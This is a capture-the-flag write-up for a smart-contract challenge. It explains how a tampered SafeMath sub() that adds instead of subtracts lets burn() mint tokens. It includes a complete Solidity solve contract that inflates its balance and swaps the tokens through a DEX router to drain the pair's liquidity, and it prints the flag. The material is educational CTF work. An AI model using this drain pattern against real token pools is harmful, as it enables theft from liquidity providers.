# Challenge 03 : You have to be kidding me.. [7 solves] [499 points] [First blood 🩸]

```
Same story. It's not that the bug is even hard, but can you find it ?
How could a guy even come up with that ?
The pair will be listed on the DEX too.
You get the flag if the pair has < 0.5 MEL$ liquidities.
```

This challenge is basically the same as last challenge, except the minting process

The mint function does not actually increase the balance of msg.sender, as add() will not increase the value in storage, but it will just return the increased value, and the returned value is not used : 
```solidity
    function mint(uint amount) external {
        balanceOf[msg.sender].add(amount);
        totalSupply.add(amount);

        emit Transfer(address(0), msg.sender, amount);
    }
```

But, in SafeMath that it is using, it has been modified :

```solidity
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
```

It should return a - b, but now it's returning a + b

So we can just use burn() to mint token :

```solidity
    function burn(uint amount) external {
        balanceOf[msg.sender] = balanceOf[msg.sender].sub(amount);
        totalSupply.sub(amount);

        emit Transfer(msg.sender, address(0), amount);
    }
```

```solidity
pragma solidity ^0.8.0;

import "./chall3.sol";

interface Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract chall3_solve {
    constructor(address chall3, address router, address wmei) public {
        hero2301(chall3).burn(999999999999 ether);
        hero2301(chall3).approve(router, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = chall3;
        path[1] = wmei;
        Router(router).swapExactTokensForTokens(999999999999 ether, 0, path, address(this), type(uint256).max);
    }
}
```

I think there's something wrong with the verification, sometimes even the pair has less than 0.5 WMEI, it will show verification fail, I think it's because sometimes the WMEI contract is token0 in the pair and sometimes it's token1, it has to be in token1 in order for the verification to work

So, just deploy the challenge again and deploy the solve contract until it can verify correctly

Flag :
```
Hero{H0w_L0ng_D1d_1t_T4k3_U_?..lmao}
```